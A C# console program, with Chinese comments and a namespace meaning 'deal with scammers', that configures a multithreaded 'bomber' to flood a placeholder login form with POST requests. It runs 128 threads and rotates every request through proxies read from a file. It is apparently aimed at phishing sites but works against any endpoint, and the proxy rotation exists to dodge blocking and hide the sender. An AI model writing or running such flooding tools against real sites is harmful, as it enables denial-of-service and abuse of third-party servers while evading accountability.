using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace 专治骗子
{
    class Program
    {
        static List<WebProxy> httpProxy = new List<WebProxy>();
        
        static int count = 0;
        static void Main(string[] args)
        {
            loadProxyList();//加载代理列表
            GeneralBomber bomber = new GeneralBomber(//配置轰炸参数
                baseUrl:"http://www.sample.com/test.php",
                userKey:"keysample",
                passKey:"valuesample",
                httpMethod:"POST",
                additionalKeyValue:new KeyValuePair<string,string>("otherkey", "othercontent"));
            BomberPerformer performer = new BomberPerformer(bomber);//创建轰炸实例
            performer.ThreadCount = 128;//128线程
            performer.OnBombSuccess += Performer_OnBombSuccess;//当请求成功时的事件
            BomberUtils.BeforeRequestSend += BomberUtils_BeforeRequestSend;//在发送请求之前的事件,用于对请求进一步修改如添加代理,添加UA
            performer.StartBomber();//开炸
        }
        static int ProxyPtr = 0;
        static object syncobj = new object();
        private static void BomberUtils_BeforeRequestSend(object sender, HttpRequestCreatedEventArgs e)
        {
            lock(syncobj){
                if (httpProxy.Count < 1) { return; }
                try
                {
                    e.Request.Proxy = httpProxy[ProxyPtr];
                }
                catch { }
                ProxyPtr++;
                if (ProxyPtr >= httpProxy.Count) { ProxyPtr = 0; }
            }
        }

        private static void Performer_OnBombSuccess(object sender, EventArgs e)
        {
            count++;
            Console.Title = count.ToString();
        }

        static public void loadProxyList() {
            Console.WriteLine("加载代理中");
            string[] proxies = File.ReadAllLines("proxies.txt");
            foreach (string proxy in proxies)
            {
                string[] list = proxy.Split('\t',':');
                if (list.Length < 2) { continue; }
                httpProxy.Add(new WebProxy("http://"+list[0]+":"+list[1]+"/"));
            }
            Console.WriteLine("加载了"+httpProxy.Count+"个代理");
        }
    }
}
